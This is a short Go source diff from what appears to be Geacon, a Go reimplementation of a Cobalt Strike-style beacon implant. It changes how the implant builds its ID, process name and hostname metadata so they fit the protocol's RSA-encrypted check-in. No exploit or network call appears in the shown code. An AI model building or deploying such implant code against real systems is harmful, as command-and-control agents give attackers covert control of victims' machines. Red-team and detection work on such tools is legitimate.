@@ -6,10 +6,24 @@ import (
 	"net"
 	"os"
 	"runtime"
+	"strings"
 )
 
 func GeaconID() int {
-	return crypt.RandomInt(10000, 99999)
+	randomInt := crypt.RandomInt(100000, 999998)
+	if randomInt%2 == 0 {
+		return randomInt
+	} else {
+		return randomInt + 1
+	}
+}
+
+func GetProcessName() string {
+	processName := os.Args[0]
+	if len(processName) > 10 {
+		processName = processName[len(processName)-9:]
+	}
+	return strings.ReplaceAll(strings.ReplaceAll(processName, "./", ""), "/", "")
 }
 
 func GetPID() int {
@@ -18,6 +32,10 @@ func GetPID() int {
 
 func GetComputerName() string {
 	sHostName, _ := os.Hostname()
+	// message too long for RSA public key size
+	if len(sHostName) > 10 {
+		sHostName = sHostName[1 : 10-1]
+	}
 	if runtime.GOOS == "linux" {
 		sHostName = sHostName + " (Linux)"
 	} else if runtime.GOOS == "darwin" {
@@ -47,5 +65,3 @@ func GetMagicHead() []byte {
 	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
 	return MagicNumBytes
 }
-
-
